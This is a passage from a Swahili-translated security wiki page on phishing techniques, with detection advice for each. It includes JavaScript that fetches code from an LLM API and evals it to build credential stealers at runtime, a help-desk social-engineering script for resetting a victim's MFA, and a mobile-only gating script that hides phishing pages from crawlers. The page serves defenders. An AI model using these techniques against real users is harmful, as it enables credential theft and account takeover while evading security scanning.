fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** code inayozalishwa hubinafsisha lure (k.m., uchanganuzi wa token ya LogoKit) na kutuma creds kwenye endpoint iliyofichwa kwenye prompt.

**Sifa za Evasion**
- Traffic hupitia domains zinazojulikana za LLM au CDN proxies zinazoaminika; wakati mwingine kupitia WebSockets kuelekea backend.
- Hakuna payload tuli; JS hasidi huwepo tu baada ya render.
- Generations zisizo za deterministic huzalisha stealers **za kipekee** kwa kila session.

**Mawazo ya Detection**
- Endesha sandboxes zikiwa na JS imewezeshwa; flag **runtime `eval`/uundaji wa script unaobadilika unaotokana na majibu ya LLM**.
- Tafuta POST za front-end zinazoelekezwa kwenye LLM APIs, zikifuatwa mara moja na `eval`/`Function` kwenye text iliyorejeshwa.
- Toa alert kwa domains za LLM ambazo hazijaidhinishwa kwenye traffic ya client, zikifuatiwa na credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Mbali na push-bombing ya kawaida, operators hulazimisha **usajili mpya wa MFA** wakati wa simu ya help-desk, na hivyo kubatilisha token iliyopo ya user. Login prompt yoyote inayofuata huonekana kuwa halali kwa victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka kwa IP ileile**.



## Utekaji wa Clipboard / Pastejacking

Washambuliaji wanaweza kunakili kwa siri commands hasidi kwenye clipboard ya mwathiriwa kutoka kwenye ukurasa wa wavuti uliodukuliwa au wenye typosquatting, kisha kumshawishi mtumiaji azibandike ndani ya **Win + R**, **Win + X** au dirisha la terminal, na hivyo kutekeleza code kiholela bila download au attachment yoyote.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Phishing ya Simu na Usambazaji wa App Hasidi (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Utekaji wa WhatsApp device-linking kupitia social engineering ya QR
* Ukurasa wa lure (kwa mfano, “channel” bandia ya ministry/CERT) huonyesha QR ya WhatsApp Web/Desktop na kumwelekeza mwathiriwa kuiscan, na hivyo kumwongeza mshambuliaji kwa siri kama **linked device**.<sup>[[12]](#references)</sup>
* Mshambuliaji hupata mara moja mwonekano wa chats/contacts hadi session iondolewe. Waathiriwa wanaweza baadaye kuona notification ya “new device linked”; defenders wanaweza kutafuta device-link events zisizotarajiwa muda mfupi baada ya kutembelea QR pages zisizoaminika.

### Phishing inayohitaji simu ili kukwepa crawlers/sandboxes
Waendeshaji wanazidi kuweka masharti ya device kwenye phishing flows zao ili desktop crawlers zisifikie final pages. Mfano wa kawaida ni script ndogo inayokagua kama DOM inaweza kutumia touch na kutuma matokeo kwa server endpoint; clients zisizo za mobile hupokea HTTP 500 (au blank page), huku watumiaji wa simu wakipewa flow kamili.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Mantiki ya `detect_device.js` (imerahisishwa):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server behaviour inayozingatiwa mara nyingi:
- Huunda session cookie wakati wa load ya kwanza.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurudisha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; huhudumia phishing ikiwa tu `true`.

Mbinu za utafutaji na utambuzi:
- Hoja ya urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetry ya Web: mfuatano wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non-mobile; njia halali za mobile victim hurudisha 200 pamoja na HTML/JS inayofuata.
- Zuia au chunguza kwa makini pages zinazoweka masharti ya maudhui pekee kupitia `ontouchstart` au device checks zinazofanana.

Vidokezo vya ulinzi:
- Endesha crawlers zikiwa na mobile-like fingerprints na JS ikiwa imewezeshwa ili kufichua gated content.
- Toa alert kuhusu majibu ya 500 yanayotiliwa shaka yanayofuata `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## References

- [1] [Kutengeneza Tofauti za Majina ya Domain Zinazotumiwa katika Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Kutafuta Phishing: Zana na Mbinu (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kuiba Credentials na Kupita 2FA kwa Kutumia noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Kuiba sessions na kupita 2FA kwa EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jinsi ya Kusakinisha na Kusanidi DKIM pamoja na Postfix kwenye Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Ripoti ya Global Incident Response ya Unit 42 ya 2025 – Toleo la Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – infra ya phishing yenye masharti ya mobile na heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Mipaka Mpya ya Mashambulizi ya Runtime Assembly: Kutumia LLMs Kuzalisha Phishing JavaScript kwa Wakati Halisi](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking, na TDS: Ndani ya Ecosystem ya Usambazaji wa Malware](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kutekwa kwa Traffic ya Microsoft's windows.com kwa Bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: App Bandia ya Dating Iliyotumiwa kama Chambo katika Kampeni Iliyoelekezwa ya Spyware nchini Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [IoCs na Samples za ESET GhostChat](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
